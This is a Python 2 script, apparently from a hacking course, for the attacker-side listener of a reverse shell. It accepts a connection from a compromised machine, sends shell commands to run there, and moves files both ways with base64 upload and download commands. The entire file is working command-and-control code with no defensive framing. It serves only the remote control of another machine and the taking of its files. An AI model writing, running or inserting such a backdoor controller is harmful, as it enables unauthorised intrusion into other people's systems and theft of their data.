#!/usr/bin/env python

import socket, argparse, json, base64

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--listen", dest="listener", help="Host IP to listen on")
    parser.add_argument("-p", "--port", dest="port", help="Port to listen on")
    options = parser.parse_args()
    if not options.listener:
        # handle error
        parser.error("[-] Please specify a host IP to listen on, use --help for more info")
    if not options.port:
        # handle error
        parser.error("[-] Please specify a port to listen on, use --help for more info")
    return options

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # enable socket re-use, if connection drops - re-establish connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Listening on " + ip + ":" + str(port) + "...")
        self.connection, address = listener.accept()
        print("[+] Connected from " + str(address) + ".")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as download_file:
            download_file.write(base64.b64decode(content))
        return "[+] File " + path + " Saved."

    def read_file(self, path):
        with open(path, "rb") as upload_file:
            return base64.b64encode(upload_file.read())

    def run(self):
        while True:
            command = raw_input("-[ ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)

options = get_arguments()
my_listener = Listener(options.listener, int(options.port))
my_listener.run()